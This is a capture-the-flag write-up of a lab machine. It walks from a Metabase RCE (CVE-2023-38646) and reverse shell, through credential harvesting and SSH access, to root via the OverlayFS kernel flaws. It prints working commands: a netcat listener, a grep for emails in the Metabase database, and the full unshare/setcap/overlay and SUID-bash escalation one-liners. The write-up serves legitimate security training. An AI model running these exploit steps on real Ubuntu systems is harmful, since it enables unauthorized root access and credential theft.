````markdown
# Analytics CTF Room Writeup

Target:analytical.htb  
Goal: Initial RCE via Metabase (CVE-2023-38646), user shell, then root via OverlayFS kernel exploit (CVE-2023-2640 & CVE-2023-32629)


````
## 1. Initial Recon & Enumeration

Started with a full TCP port scan:  
```bash
nmap -p- -sV -T4 analytical.htb


Found port **80** open, HTTP running.
Added domain to `/etc/hosts` for convenience:

```
10.10.x.x analytical.htb
```

Visited `http://analytical.htb` → Redirected to Metabase login page.

---
````
## 2. Subdomain Bruteforce & Discovering Data

Used subdomain enumeration tools (like `gobuster` or `ffuf`) to find:
`data.analytical.htb` → another Metabase login page.

---

## 3. Metabase Version & RCE CVE-2023-38646

Searched for Metabase exploits → found CVE-2023-38646, an RCE in Metabase’s API.

Checked API for version and token needed:

```bash
curl http://data.analytical.htb/api/session/properties
```

Got version info and confirmation this version is vulnerable.

---

## 4. Getting a Reverse Shell

Set up a Netcat listener on local machine:

```bash
nc -lvnp 4444
```

Used the CVE PoC/exploit with the token from above → got reverse shell as `metabase` user.

---

## 5. Post-Exploitation: Finding Credentials

On the shell, ran:

```bash
env
```

Saw some environment variables with username and password hints.

Next, ran:

```bash
strings metabase.db.mv.db | grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}'
```

Got emails, looked for those related to our user.

Used these emails and guessed passwords (or reused found creds) to log into the Metabase web interface.

---

## 6. SSH Access

Using found credentials, tried SSH:

```bash
ssh user@analytical.htb
```

Login successful.

Grabbed user flag.

---

## 7. Kernel and OS Info

Ran:

```bash
uname -a
lsb_release -a
```

Found kernel: `6.2.0-25-generic`
Ubuntu release: `22.04.03`

---

## 8. Root Privilege Escalation – OverlayFS Kernel Exploit

Looked for Ubuntu kernel exploits for this version → found CVE-2023-2640 & CVE-2023-32629.

The exploit abuses OverlayFS to gain root privileges by mounting OverlayFS with a crafted setup and copying python3 with elevated capabilities.

---

## 9. Running the Exploit

Run this command:

```bash
unshare -rm sh -c "
mkdir l u w m &&
cp /usr/bin/python3 l/ &&
setcap cap_setuid+eip l/python3 &&
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/*;"
```

This starts a new shell with root privileges inside a user namespace, creates necessary folders, copies python3 and gives it special capabilities, mounts OverlayFS combining those folders, and triggers a copy preserving root capabilities.

Then run:

```bash
u/python3 -c 'import os; os.setuid(0); os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

This runs the python3 with root privileges, copies bash to `/var/tmp/bash`, sets it as SUID root executable, runs it to spawn a root shell, then cleans up.

---

## 10. Final Result

gained root access by running the SUID bash shell at `/var/tmp/bash`:

```bash
/var/tmp/bash -p
```

Now I can read the root flag and fully control the machine.
